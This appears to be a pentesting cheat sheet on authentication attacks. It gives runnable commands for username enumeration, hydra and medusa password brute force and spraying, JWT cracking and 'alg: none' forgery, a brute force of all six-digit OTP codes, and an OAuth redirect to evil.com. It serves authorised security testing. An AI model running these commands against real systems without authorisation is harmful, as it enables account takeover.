# Authentication Attacks

Attacks against login, session management, password reset, MFA, and token handling.

## Username / User Enumeration

| Tool / Command | Description |
|---------------|-------------|
| `ffuf -w users.txt -u http://target/login -X POST -d "user=FUZZ&pass=test" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid user" -o results.json` | Fuzz usernames; different response or timing |
| `wfuzz -z file,users.txt -d "username=FUZZ" -u http://target/login` | wfuzz alternative |
| Timing / error message diff, password reset "user not found" | Passive enum via forgot password |
| `hydra -L users.txt -p test http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"` | Online brute with Hydra |

## Password Attacks (Online)

Use **very** low and slow rates. Respect lockouts and rate limits.

```bash
# Hydra examples
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
hydra -L users.txt -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -t 4

# Medusa, ncrack, etc.
medusa -h target -u admin -P rockyou.txt -M http -m DIR:/login
```

**Password spraying** (one password across many accounts):
```bash
# Use a short common list + delay
hydra -L users.txt -p "Summer2026!" http-post-form ...
```

## Session & Cookie Attacks

- Predictable session IDs
- Insecure cookie flags (missing HttpOnly, Secure, SameSite)
- Session fixation
- JWT attacks (see below)

```bash
# Test cookie
curl -b "session=abc123" http://target/profile

# Check JWT (use jwt.io or jwt_tool)
python3 jwt_tool.py <token> -T -I
```

## JWT Attacks (Modern)

Common issues:
- `alg: none`
- Weak secret (`secret`, `password`, `changeme`)
- `kid` header path traversal / injection
- Algorithm confusion (RS256 -> HS256)

```bash
# Tools
pipx install pyjwt
jwt_tool <token> -C -d secrets.txt   # crack secret
# Forge with none alg or new key

# Crack secret with hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# None algorithm forgery example (using jwt_tool or manual)
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","iat":1234567890}
```

## Full Authentication Testing Workflow Examples

```bash
# Username enum with timing or response diff
ffuf -w users.txt:USER -u http://target/login \
  -X POST -d "username=USER&password=test123" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "user does not exist" -o users.txt

# Password spray (very slow + jitter)
hydra -L users.txt -p 'Summer2026!' -t 1 -w 45 \
  http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"

# Session fixation test
curl -c before.txt https://target/login
curl -b before.txt -c after.txt https://target/login   # compare Set-Cookie
```

## MFA / 2FA & OAuth Examples

```bash
# OTP brute (parallel with care)
seq -w 000000 999999 | parallel -j 5 'curl -s -X POST https://target/2fa -d "code={}" -H "Cookie: ..." | grep -q success && echo {}'

# OAuth redirect_uri open redirect
https://target/oauth?redirect_uri=https://evil.com/callback

# Scope escalation
curl -X POST https://target/token -d "scope=admin+write"
```

## Other Auth Issues (2026)

- OAuth / OIDC misconfigs: redirect_uri validation, state/nonce missing, scope abuse.
- Password reset token leakage (in URL, email, predictable).
- Rate limit bypass via X-Forwarded-For, client headers, or distributed sources.
- MFA bypass: response manipulation, backup codes, rate limits on OTP, remember-device flaws.
- API keys in JS / source, or weak bearer tokens.

## Tools (2026 Stack)

- ffuf + wfuzz for custom
- Burp Intruder / Turbo Intruder
- `nuclei -t http/exposures/` and auth templates
- `authz` / custom scripts with httpx + Python
- sqlmap for auth bypass via SQLi in login

## Tips

- Always capture baseline responses for success vs fail.
- Use `-fs` (filter size) or `-fr` (filter regex) in ffuf.
- GraphQL / JSON APIs require different body and Content-Type.
- Monitor for account lockout and CAPTCHA.

References: OWASP ASVS, PortSwigger auth labs, HackTricks authentication.
